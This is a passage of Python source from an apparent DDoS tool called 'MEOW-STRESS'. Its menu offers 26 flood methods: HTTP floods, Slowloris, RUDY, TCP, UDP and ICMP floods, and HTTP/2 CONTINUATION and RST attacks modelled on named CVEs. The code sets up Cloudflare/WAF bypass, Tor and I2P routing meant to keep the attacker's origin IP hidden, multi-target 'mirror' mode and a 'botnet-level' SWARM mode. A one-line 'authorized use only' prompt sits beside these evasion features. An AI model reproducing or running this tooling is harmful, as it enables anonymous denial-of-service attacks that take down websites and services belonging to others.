    if method == "PHANTOM_MIX":
        _ensure_socks()
        tor_ok = _ensure_tor() if not _tor_available() else True
        i2p_ok = _ensure_i2p() if not _i2p_available() else True
        if not tor_ok and not i2p_ok:
            err("PHANTOM_MIX : ni Tor ni I2P n'ont pu démarrer."); return
        if tor_ok: _ensure_stem()
        modes = (["Tor"] if tor_ok else []) + (["I2P"] if i2p_ok else [])
        ok(f"PHANTOM_MIX : [{G1}]{' + '.join(modes)}[/] — rotation aléatoire entre les réseaux")
        console.print()

    # ── WRAITH : auto-install I2P ─────────────────────────────
    if method == "WRAITH":
        if not _ensure_i2p():
            err("I2P indisponible — WRAITH annulé."); return
        info(f"I2P opérationnel sur [{G1}]127.0.0.1:4444[/] — garlic routing actif")
        ok("Tunnels I2P en cours de construction (peut prendre 1-2 min au démarrage)...")
        console.print()

    # ── PROXY HEALTHCHECK avant l'attaque ──────────────────────
    if use_proxy:
        alive = _proxy_healthcheck(url, sample=50, timeout=4)
        if alive == 0:
            warn("Aucun proxy vivant — attaque lancée SANS proxy.")
            use_proxy = False
        elif alive < workers // 2:
            warn(f"Seulement {alive} proxies vivants pour {workers} workers — "
                 f"certains workers partageront les mêmes proxies.")

    # RESONANCE : calibration avant lancement
    resonance_timer = None
    if method == "RESONANCE":
        base_lat = _calibrate_resonance(url, use_proxy)
        resonance_timer = _ResonanceTimer(base_lat, workers)
        ok(f"Resonance calibrated — interval [{G1}]{resonance_timer.interval*1000:.0f}ms[/]  workers [{G1}]{workers}[/]")
        ok(f"Theoretical max load: [{G1}]{workers / resonance_timer.interval:.1f}[/] req/s sustained")
        console.print()

    # PULSAR : calibration + barrier + sleep_ref partagé
    pulsar_barrier  = None
    pulsar_sleep    = None
    if method == "PULSAR":
        base_lat = _calibrate_resonance(url, use_proxy)
        # Dormir 40% du temps de réponse entre les vagues
        pulsar_sleep   = [max(0.05, base_lat * 0.40)]
        pulsar_barrier = threading.Barrier(workers, timeout=6)
        ok(f"PULSAR calibrated — burst every [{G1}]{pulsar_sleep[0]*1000:.0f}ms[/]  "
           f"workers [{G1}]{workers}[/]  burst_rate=[{G1}]{workers / (base_lat + pulsar_sleep[0]):.1f}[/] req/s")
        if use_cffi:
            ok(f"Cloudflare bypass: [{G1}]ACTIVE[/] (curl_cffi Chrome TLS fingerprint)")
        console.print()

    # ── Construire le MirrorCycle si mirror mode ─────────────────
    # Pour L7 HTTP : on normalise chaque cible en URL complète
    # Pour L3/L4   : on extrait les hosts
    mirror_http = None
    mirror_l3   = None
    if mirror_mode:
        http_urls   = [_parse_target(t)[2] for t in mirror_targets_raw]
        mirror_http = _MirrorCycle(http_urls)
        l3_hosts    = [_parse_target(t)[0] for t in mirror_targets_raw]
        l3_port     = port
        mirror_l3   = _MirrorCycle(l3_hosts)
        info(f"[bold {G1}]MIRROR MODE[/] — [{G1}]{len(mirror_targets_raw)}[/] cibles : "
             + "  ".join(f"[{CY}]{t}[/]" for t in mirror_targets_raw))
        console.print()

    threads = []
    for _ in range(workers):
        # ── Mirror override pour L7 HTTP ──────────────────────────
        if mirror_mode and method in HTTP_METHODS - {"RESONANCE","PULSAR"}:
            t = threading.Thread(target=_worker_http_mirror,
                                 args=(mirror_http, stats, use_proxy, UA_LIST, use_cffi),
                                 daemon=True)
        # ── Mirror override pour ICMP (L3) ────────────────────────
        elif mirror_mode and method == "ICMP":
            t = threading.Thread(target=_worker_icmp_mirror,
                                 args=(mirror_l3, stats), daemon=True)
        # ── Mirror override pour UDP (L4) ─────────────────────────
        elif mirror_mode and method == "UDP":
            t = threading.Thread(target=_worker_udp_mirror,
                                 args=(mirror_l3, l3_port, stats), daemon=True)
        # ── Méthodes standard (pas de mirror ou méthodes spéciales) ──
        elif method == "HTTP_GET":     t = threading.Thread(target=_worker_http_get,    args=(url, stats, use_proxy, UA_LIST), daemon=True)
        elif method == "HTTP_POST":    t = threading.Thread(target=_worker_http_post,   args=(url, stats, use_proxy, UA_LIST), daemon=True)
        elif method == "HTTP_HEAD":    t = threading.Thread(target=_worker_http_head,   args=(url, stats, use_proxy, UA_LIST), daemon=True)
        elif method == "HTTP_BYPASS":  t = threading.Thread(target=_worker_http_bypass, args=(url, stats, use_proxy, UA_LIST), daemon=True)
        elif method == "HTTP_JSON":    t = threading.Thread(target=_worker_http_json,   args=(url, stats, use_proxy, UA_LIST), daemon=True)
        elif method == "HTTP_COOKIE":  t = threading.Thread(target=_worker_http_cookie, args=(url, stats, use_proxy, UA_LIST), daemon=True)
        elif method == "HTTP_XMLRPC":  t = threading.Thread(target=_worker_xmlrpc,      args=(url, stats, use_proxy, UA_LIST), daemon=True)
        elif method == "HTTP_RANGE":   t = threading.Thread(target=_worker_http_range,  args=(url, stats, use_proxy, UA_LIST), daemon=True)
        elif method == "HTTP_MIXED":   t = threading.Thread(target=_worker_http_mixed,  args=(url, stats, use_proxy, UA_LIST), daemon=True)
        elif method == "RESONANCE":    t = threading.Thread(target=_worker_resonance,   args=(url, stats, use_proxy, UA_LIST, resonance_timer), daemon=True)
        elif method == "PULSAR":       t = threading.Thread(target=_worker_pulsar,      args=(url, stats, use_proxy, UA_LIST, pulsar_barrier, pulsar_sleep, use_cffi), daemon=True)
        elif method == "SPECTER":        t = threading.Thread(target=_worker_specter,          args=(url, stats, UA_LIST, specter_renew, specter_lock, specter_counter, specter_exit_ip), daemon=True)
        elif method == "WRAITH":         t = threading.Thread(target=_worker_wraith,           args=(url, stats, UA_LIST), daemon=True)
        elif method == "PHANTOM_MIX":    t = threading.Thread(target=_worker_phantom_mix,      args=(url, stats, UA_LIST), daemon=True)
        elif method == "H2_CONTINUATION":t = threading.Thread(target=_worker_h2_continuation,  args=(host, port, stats, UA_LIST), daemon=True)
        elif method == "H2_RST":         t = threading.Thread(target=_worker_h2_rst,           args=(host, port, stats, UA_LIST), daemon=True)
        elif method == "WS_FLOOD":       t = threading.Thread(target=_worker_ws_flood,         args=(host, port, parsed_path, use_ssl, stats), daemon=True)
        elif method == "SLOW_CHUNK":     t = threading.Thread(target=_worker_slow_chunk,       args=(host, port, parsed_path, use_ssl, stats, UA_LIST), daemon=True)
        elif method == "QUIC_FLOOD":     t = threading.Thread(target=_worker_quic_flood,       args=(host, 443, stats), daemon=True)
        elif method == "SLOWLORIS":      t = threading.Thread(target=_worker_slowloris,        args=(host, port, stats, use_proxy),  daemon=True)
        elif method == "RUDY":           t = threading.Thread(target=_worker_rudy,             args=(host, port, parsed_path, stats, use_proxy), daemon=True)
        elif method == "TLS":            t = threading.Thread(target=_worker_tls,              args=(host, port, stats, use_proxy),  daemon=True)
        elif method == "TCP":            t = threading.Thread(target=_worker_tcp,              args=(host, port, stats, use_proxy),  daemon=True)
        elif method == "UDP":            t = threading.Thread(target=_worker_udp,              args=(host, port, stats),             daemon=True)
        elif method == "ICMP":           t = threading.Thread(target=_worker_icmp,             args=(host, stats),                   daemon=True)
        else:                            continue
        t.start()
        threads.append(t)

    cffi_note   = f"  [{G1}]CF-BYPASS[/]" if use_cffi else ""
    mirror_note = f"  [{G1}]MIRROR×{len(mirror_targets_raw)}[/]" if mirror_mode else ""
    proxy_note  = f"  proxy=[{G1}]ON (SOCKS)[/]" if use_proxy and method in SOCKET_METHODS \
             else f"  proxy=[{G1}]ON[/]"          if use_proxy \
             else f"  proxy=[{DM}]OFF[/]"
    info(f"[{G1}]{len(threads)}[/] workers — method [{OR}]{method}[/]{proxy_note}{cffi_note}{mirror_note} — {duration}s")
    console.print()

    display_target = (f"{len(mirror_targets_raw)} targets [MIRROR]"
                      if mirror_mode else target)
    end_time = time.time() + duration
    try:
        with Live(console=console, refresh_per_second=4) as live:
            while time.time() < end_time and not _STOP.is_set():
                remaining = max(0, end_time - time.time())
                tbl = stats.render_table(display_target, method, True)
                subtitle = None
                if specter_exit_ip is not None:
                    circuits = specter_counter[0] // max(specter_renew, 1)
                    subtitle = (f"[{G1}]TOR ANON[/]  "
                                f"[{CY}]exit IP:[/] [{G1}]{specter_exit_ip[0]}[/]  "
                                f"[{CY}]circuits:[/] [{G1}]{circuits}[/]  "
                                f"[{CY}]origin:[/] [{RD}]HIDDEN[/]")
                elif method == "WRAITH":
                    subtitle = (f"[{G1}]I2P GARLIC ROUTING[/]  "
                                f"[{CY}]outproxy:[/] [{G1}]127.0.0.1:4444[/]  "
                                f"[{CY}]origin:[/] [{RD}]HIDDEN[/]  "
                                f"[{DM}]tunnels auto-regénérés toutes les 10min[/]")
                elif mirror_mode:
                    subtitle = (f"[{G1}]MIRROR[/]  "
                                + "  ".join(f"[{CY}]{t}[/]" for t in mirror_targets_raw[:4])
                                + (f"  [{DM}]+{len(mirror_targets_raw)-4} more[/]"
                                   if len(mirror_targets_raw) > 4 else ""))
                elif resonance_timer:
                    eff = workers / max(resonance_timer.interval, 0.001)
                    subtitle = (f"[{CY}]interval=[{G1}]{resonance_timer.interval*1000:.1f}ms[/]  "
                                f"adaptations=[{G1}]{resonance_timer.generation}[/]  "
                                f"eff=[{G1}]{eff:.1f} req/s[/]")
                elif pulsar_sleep is not None:
                    waves = int(stats.elapsed / max(pulsar_sleep[0], 0.01))
                    subtitle = (f"[{CY}]wave_interval=[{G1}]{pulsar_sleep[0]*1000:.0f}ms[/]  "
                                f"waves=[{G1}]{waves}[/]  workers/wave=[{G1}]{workers}[/]"
                                + (f"  [{G1}]CF-BYPASS[/]" if use_cffi else ""))
                if subtitle:
                    panel_content = Panel(tbl,
                        title=f"[bold {RD}]◈ MEOW-STRESS :: {method} ◈  [{OR}]{remaining:.0f}s remaining[/]",
                        subtitle=subtitle, border_style=RD)
                else:
                    panel_content = Panel(tbl,
                        title=f"[bold {RD}]◈ MEOW-STRESS :: {method} ◈  [{OR}]{remaining:.0f}s remaining[/]",
                        border_style=RD)
                live.update(panel_content)
                time.sleep(0.25)
    except KeyboardInterrupt:
        pass
    finally:
        _STOP.set()
        if pulsar_barrier:
            try: pulsar_barrier.abort()
            except Exception: pass

    console.print()
    console.print(Panel(
        stats.render_table(display_target, method, False),
        title=f"[bold {G1}]◈ ATTACK COMPLETE ◈",
        border_style=G2
    ))
    _save_results(display_target, method, stats, workers, duration)

def _save_results(target, method, stats: Stats, workers, duration):
    os.makedirs("data", exist_ok=True)
    fname = f"data/stress_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    import json
    data = {
        "target": target, "method": method,
        "workers": workers, "duration_s": duration,
        "total": stats.sent, "success": stats.ok, "failed": stats.fail,
        "rps": round(stats.rps, 2),
        "avg_latency_ms": round(stats.avg_ms, 2),
        "bytes_sent": stats.bytes_sent,
        "timestamp": datetime.now().isoformat()
    }
    with open(fname, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2)
    ok(f"Results saved: [bold]{fname}[/]")

# ─── MAIN RUN ────────────────────────────────────────────────

METHODS = {
    # L7 HTTP
    "1":  ("HTTP_GET",    "L7  · HTTP GET flood       (web server, proxy rotation)"),
    "2":  ("HTTP_POST",   "L7  · HTTP POST flood      (forms / APIs, proxy rotation)"),
    "3":  ("HTTP_HEAD",   "L7  · HTTP HEAD flood      (lightweight, proxy rotation)"),
    "4":  ("HTTP_BYPASS", "L7  · Bypass mode          (CF/WAF + IP spoof + cache bust)"),
    "5":  ("HTTP_JSON",   "L7  · JSON POST flood      (REST APIs, proxy rotation)"),
    "6":  ("HTTP_COOKIE", "L7  · Cookie overflow      (session stores, proxy rotation)"),
    "7":  ("HTTP_XMLRPC", "L7  · XMLRPC multicall     (WordPress, proxy rotation)"),
    "8":  ("HTTP_RANGE",  "L7  · Range header abuse   (CVE-2011-3192 style, proxy rotation)"),
    "9":  ("HTTP_MIXED",  "L7  · Mixed methods        (random GET/POST/HEAD/BYPASS + proxy)"),
    # Méthodes UNIQUE
    "16": ("RESONANCE",  "L7  · RESONANCE            (Little's Law adaptive saturation — low BW, max load)"),
    "17": ("PULSAR",     "L7  · PULSAR               (vagues synchronisées Barrier — sature accept() OS, bypass CF)"),
    "18": ("SPECTER",    "L7  · SPECTER [ANON]       (flood via Tor — IP d'origine JAMAIS révélée, circuit renewal)"),
    "19": ("WRAITH",     "L7  · WRAITH  [ANON]       (flood via I2P garlic routing — origine invisible, pas de Tor)"),
    # HTTP/2 & WebSocket Exploits
    "20": ("H2_CONTINUATION","L7  · H2_CONTINUATION  [★★★★★] HEADERS sans END_HEADERS → OOM serveur (CVE-2024-27316 style)"),
    "21": ("H2_RST",         "L7  · H2_RST           [★★★★]  RST Storm → alloc/dealloc per stream (CVE-2023-44487 style)"),
    "22": ("WS_FLOOD",       "L7  · WS_FLOOD         [★★★★]  WebSocket PING flood → PONG obligatoire RFC 6455"),
    "23": ("SLOW_CHUNK",     "L7  · SLOW_CHUNK        [★★★]  Chunked slow body → bypass RUDY mitigations"),
    "24": ("QUIC_FLOOD",     "L4  · QUIC_FLOOD        [★★★]  UDP/443 QUIC Initial flood → HTTP/3 targets"),
    # Double anonymat
    "25": ("PHANTOM_MIX",    "L7  · PHANTOM_MIX [ANON][★★★★]  Tor + I2P en alternance — double pool d'exit IPs"),
    # Botnet-level
    "26": ("SWARM",          "MEGA· SWARM        [★★★★★] MULTI-VECTEUR 5 méthodes simultanées — pire qu'un botnet"),
    # L7 Socket
    "10": ("SLOWLORIS",   "L7  · Slowloris            (conn exhaustion, SOCKS proxy)"),
    "11": ("RUDY",        "L7  · R-U-Dead-Yet         (slow POST body, SOCKS proxy)"),
    "12": ("TLS",         "L7  · TLS handshake flood  (CPU-heavy on server, SOCKS proxy)"),
    # L4
    "13": ("TCP",         "L4  · TCP flood            (connection flood, SOCKS proxy)"),
    "14": ("UDP",         "L4  · UDP flood            (stateless packet flood)"),
    # L3
    "15": ("ICMP",        "L3  · ICMP flood           (ping flood / network layer)"),
}

def run():
    show_module_banner("stress")
    cat_talk(CAT_HACKER, "Stress testing engine loaded — 26 methods.", OR)
    console.print()

    warn("AUTHORIZED USE ONLY — Unauthorized stress testing is illegal.")
    warn("Use only on systems YOU OWN or have EXPLICIT WRITTEN PERMISSION to test.")
    console.print()
    if not Confirm.ask(f"  [{OR}]◈ I confirm this is an authorized target[/]", default=False):
        info("Aborted."); return

    if HAS_CFFI:
        ok(f"curl_cffi detected — Cloudflare/JA3 bypass [{G1}]AVAILABLE[/]")
    else:
        warn("curl_cffi not installed — Cloudflare bypass unavailable")
        warn(f"  Install: [{CY}]pip install curl_cffi[/]")
    console.print()

    while True:
        console.print(Rule(f"[{G1}] STRESS TEST — 26 METHODS ", style=G2))
        console.print(f"  [{RD}]── ★ BOTNET-LEVEL — Multi-Vecteur ───────────────────────────[/]")
        for k in ("26",):
            _, desc = METHODS[k]
            console.print(f"  [{RD}][{k:>2}][/] {desc}")
        console.print(f"  [{DM}]── Application Layer L7 HTTP (proxy rotation) ──────────────[/]")
        for k in ("1","2","3","4","5","6","7","8","9"):
            _, desc = METHODS[k]
            console.print(f"  [{G1}][{k:>2}][/] {desc}")
        console.print(f"  [{DM}]── UNIQUE — Méthodes Avancées (+ bypass Cloudflare) ────────[/]")
        for k in ("16","17"):
            _, desc = METHODS[k]
            console.print(f"  [{G1}][{k:>2}][/] {desc}")
        console.print(f"  [{DM}]── ANONYMAT — IP d'origine jamais révélée ───────────────────[/]")
        for k in ("18","19","25"):
            _, desc = METHODS[k]
            console.print(f"  [{G1}][{k:>2}][/] {desc}")
        console.print(f"  [{DM}]── HTTP/2 & WebSocket Exploits ──────────────────────────────[/]")
        for k in ("20","21","22","23","24"):
            _, desc = METHODS[k]
            console.print(f"  [{CY}][{k:>2}][/] {desc}")
        console.print(f"  [{DM}]── Application Layer L7 Socket (SOCKS proxy) ───────────────[/]")
        for k in ("10","11","12"):
            _, desc = METHODS[k]
            console.print(f"  [{G1}][{k:>2}][/] {desc}")
        console.print(f"  [{DM}]── Transport Layer (L4) / Network Layer (L3) ────────────────[/]")
        for k in ("13","14","15"):
            _, desc = METHODS[k]
            console.print(f"  [{G1}][{k:>2}][/] {desc}")
        console.print(f"  [{G1}][ 0][/] Back")
        console.print()
        choice = ask_choice("Method", "0")
        if choice == "0": break
        if choice not in METHODS:
            warn("Invalid choice"); continue

        method, _ = METHODS[choice]
        console.print()

        target = Prompt.ask(f"  [{G1}]◈ Target (IP / URL / domain)[/]").strip()
        if not target: continue

        # Mirror mode — cibles supplémentaires (pas pour méthodes anon / raw / SWARM)
        _NO_MIRROR = {"SPECTER","WRAITH","PHANTOM_MIX","SWARM",
                      "H2_CONTINUATION","H2_RST","WS_FLOOD","SLOW_CHUNK","QUIC_FLOOD"}
        extra_targets = []
        mirror_eligible = method in (
            "HTTP_GET","HTTP_POST","HTTP_HEAD","HTTP_BYPASS","HTTP_JSON",
            "HTTP_COOKIE","HTTP_XMLRPC","HTTP_RANGE","HTTP_MIXED","ICMP","UDP"
        ) and method not in _NO_MIRROR
        if mirror_eligible:
            extra_raw = Prompt.ask(
                f"  [{CY}]◈ Mirror targets (autres cibles, séparées par virgule — vide = désactivé)[/]",
                default=""
            ).strip()
            if extra_raw:
                extra_targets = [t.strip() for t in extra_raw.split(",") if t.strip()]
                ok(f"Mirror mode: [{G1}]{1 + len(extra_targets)}[/] cibles totales")

        default_workers = 50 if method in ("HTTP_GET","HTTP_POST","HTTP_JSON","TCP","PULSAR") else 20
        try:
            workers = IntPrompt.ask(f"  [{G1}]◈ Workers[/]", default=default_workers)
            workers = max(1, min(workers, 500))
        except Exception:
            workers = default_workers

        try:
            duration = IntPrompt.ask(f"  [{G1}]◈ Duration (seconds)[/]", default=30)
            duration = max(5, min(duration, 300))
        except Exception:
            duration = 30

        # Proxy + option CF bypass pour les méthodes HTTP
        use_proxy  = False
        use_cffi   = False

        # Méthodes avec anonymat ou raw TLS — pas de proxy externe
        _ANON_METHODS = {"SPECTER","WRAITH","PHANTOM_MIX",
                         "H2_CONTINUATION","H2_RST","WS_FLOOD","SLOW_CHUNK","QUIC_FLOOD"}
        if method == "SWARM":
            use_proxy = Confirm.ask(f"  [{OR}]◈ SWARM — Use proxy rotation? (HTTP/SOCKS)[/]", default=False)
        elif method in _ANON_METHODS:
            if method in ("SPECTER","WRAITH","PHANTOM_MIX"):
                info(f"[{G1}]{method}[/] — proxy externe désactivé (anonymat géré par Tor/I2P)")
            else:
                info(f"[{G1}]{method}[/] — connexion TLS directe (pas de proxy support pour cette méthode)")
        elif method not in ("UDP", "ICMP") and method not in _ANON_METHODS:
            if method in ("TCP","SLOWLORIS","RUDY","TLS"):
                proxy_label = f"[{OR}]◈ Use proxy rotation? (SOCKS — requires PySocks)[/]"
            else:
                proxy_label = f"[{OR}]◈ Use proxy rotation? (HTTP/SOCKS)[/]"
            use_proxy = Confirm.ask(f"  {proxy_label}", default=False)

        # Option curl_cffi (bypass Cloudflare / JA3) pour les méthodes HTTP standard
        _CFFI_ELIGIBLE = {"HTTP_GET","HTTP_POST","HTTP_HEAD","HTTP_BYPASS","HTTP_JSON",
                          "HTTP_COOKIE","HTTP_XMLRPC","HTTP_RANGE","HTTP_MIXED",
                          "RESONANCE","PULSAR","SWARM"}
        if method in _CFFI_ELIGIBLE:
            if HAS_CFFI:
                use_cffi = Confirm.ask(
                    f"  [{G1}]◈ Bypass Cloudflare/JA3? (curl_cffi Chrome fingerprint)[/]",
                    default=(method in ("PULSAR","SWARM"))
                )
            else:
                info(f"[{DM}]curl_cffi not installed — no CF bypass. pip install curl_cffi[/]")

        if method == "RESONANCE":
            info("RESONANCE — recommended: 10-30 workers")
        if method == "PULSAR":
            info(f"PULSAR — recommended: [{G1}]50-100 workers[/], bursts synchronisés")
        if method == "SPECTER":
            info(f"SPECTER — recommended: [{G1}]5-15 workers[/] (Tor est lent, 1-5s/req)")
            info(f"stem requis pour circuit renewal: [{CY}]pip install stem[/]")
        if method == "WRAITH":
            info(f"WRAITH — recommended: [{G1}]5-20 workers[/] (I2P est plus stable que Tor)")
            info(f"Attendre 1-2 min que les tunnels I2P soient construits si I2P vient de démarrer")
        if method == "PHANTOM_MIX":
            info(f"PHANTOM_MIX — recommended: [{G1}]10-30 workers[/] (Tor+I2P — lent mais double anonymat)")
        if method == "H2_CONTINUATION":
            info(f"H2_CONTINUATION — requires HTTPS target. [{G1}]20-50 workers[/] recommended")
            info(f"[{RD}]Très efficace contre serveurs non-patchés[/] — Apache httpd, nginx <1.25.3")
        if method == "H2_RST":
            info(f"H2_RST — requires HTTPS target. [{G1}]30-80 workers[/] recommended")
        if method == "WS_FLOOD":
            info(f"WS_FLOOD — target must support WebSocket. [{G1}]20-50 workers[/]")
        if method == "SLOW_CHUNK":
            info(f"SLOW_CHUNK — recommended: [{G1}]10-30 workers[/] (chaque worker garde une connexion ouverte)")
        if method == "QUIC_FLOOD":
            info(f"QUIC_FLOOD — UDP/443. [{G1}]1-5 workers[/] suffisent (pas de throttle)")
            info(f"Target must support HTTP/3 (Cloudflare, Caddy, nginx ≥1.25)")
        if method == "SWARM":
            info(f"SWARM — [{RD}]MODE BOTNET SIMULÉ[/] — [{G1}]100-200 workers[/] pour effet maximal")
            info(f"5 méthodes simultanées : BYPASS + PULSAR + COOKIE + SLOWLORIS + TLS")

        console.print()
        info(f"Target: [{CY}]{target}[/]  Method: [{OR}]{method}[/]  "
             f"Workers: [{G1}]{workers}[/]  Duration: [{G1}]{duration}s[/]"
             + (f"  [{G1}]CF-BYPASS[/]" if use_cffi else ""))
        console.print()

        if method == "SWARM":
            _run_swarm(target, workers, duration, use_proxy, use_cffi)
        else:
            _run_attack(target, method, workers, duration, use_proxy, use_cffi,
                        extra_targets=extra_targets if extra_targets else None)
        console.print()
